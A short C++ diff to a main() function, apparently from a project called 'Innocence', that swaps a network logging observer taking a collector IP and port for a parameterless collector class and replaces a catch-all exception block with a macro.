@@ -16,8 +16,8 @@ int main(int argc, char * argv[])
     try
 	{
         LOG.setHeader(Innocence::STEALTH_AUDIT_HEADER);
-	    LOG.addObserver(new Common::LogToNetwork(Innocence::AUDIT_COLLECTOR_IP, Innocence::AUDIT_COLLECTOR_PORT));
-		LOG.addObserver(new Common::LogToConsole());
+	    LOG.addObserver(new Common::LogToCollector);
+		LOG.addObserver(new Common::LogToConsole);
 
         System::Process::This thisProcess;
         if(!System::isAdministrator())
@@ -48,9 +48,6 @@ int main(int argc, char * argv[])
     {
 		LOG << e.what();
     }
-	catch(...)
-	{
-		LOG << "Unknown exception";
-	}
+	CATCH_UNKNOWN_EXCEPTION
 	return exitCode;
 }
